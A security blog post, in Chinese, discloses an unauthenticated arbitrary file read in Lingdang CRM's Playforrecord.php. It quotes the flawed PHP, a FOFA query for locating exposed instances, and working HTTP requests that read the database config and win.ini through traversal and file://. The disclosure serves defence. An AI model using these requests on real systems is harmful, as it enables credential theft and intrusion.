---
title: "灵当CRM Playforrecord.php 文件读取漏洞"
source: https://mrxn.net/jswz/51mis-modules-Accounts-Playforrecord-download-fileread.html
asset_dir: assets/灵当crm-playforrecord.php-文件读取漏洞
---

# 灵当CRM Playforrecord.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/23 08:30
- 1310浏览
- [0评论](#comment)
- 16分钟阅读

---

# 漏洞简介

灵当CRM是一款专为中小企业打造的智能[客户关系管理](#)工具，由上海灵当信息科技有限公司开发并运营。广泛应用于金融、教育、医疗、IT服务、房地产等多个行业领域，帮助企业实现客户个性化管理需求，提升企业竞争力。无论是新客户开拓、老客户维护，还是销售过程管理、服务管理等方面，灵当CRM都能提供全面、高效的解决方案。是一款功能全面、用户友好、支持定制化、数据分析强大且价格合理的CRM[软件](#)，是中小型企业实现销售、服务、财务一体化管理的理想选择。灵当CRM `/crm/modules/Accounts/Playforrecord.php` 接口存在任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

客户关系管理

# 影响版本

# fofa语法

> `body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")`

# 漏洞分析

直接看 `/crm/modules/Accounts/Playforrecord.php` 的业务实现逻辑如下

```
<?php
if(!empty($_REQUEST['download'])){
    downfile2($_REQUEST['download']);
}else{
    global $adb;
    global $current_user;
    $newfolder='';
    $languageType= getLanguageType($current_user);
    $smarty = new lingdangCRM_Smarty;
    $smarty->display("Playforrecord.tpl");
}
function downfile2($fileurl)
{
    ob_start();
    $filename=$fileurl;
    $date=date("Ymd-H:i:m");
    header( "Content-type:   application/octet-stream ");
    header( "Accept-Ranges:   bytes ");
    header( "Content-Disposition:   attachment;   filename= {$date}.wav");
    $size=readfile($filename);
    header( "Accept-Length: " .$size);
}
```

将 `download` 参数的值无任何过滤和校验就带入 `downfile2` 方法中，而其直接使用 `readfile` 方法进行文件操作，因此直接跟文件路径或者利用PHP伪协议 `file:///` 读取系统任意文件，造成任意文件读取漏洞。因其使用 `$_REQUEST` 进行获取参数，因此支持 GET POST COOKIE三种方式传参，需要注意。

漏洞预警服务

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用-读取数据库配置信息

```
GET /crm/modules/Accounts/Playforrecord.php HTTP/1.1
Host: 51mis.mrxn.net
Cookie: download=../../config.inc.php
```

或者 读取系统其他位置文件，如 `c:/windows/win.ini`

```
GET /crm/modules/Accounts/Playforrecord.php HTTP/1.1
Host: 51mis.mrxn.net
Cookie: download=file:///c:/windows/win.ini
```

[![灵当CRM Playforrecord.php 文件读取漏洞](images/img-001-6876e58eba76.webp)](https://image.mrxn.net/fc8ae9764ecf40c989c7d736b36e4faa.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
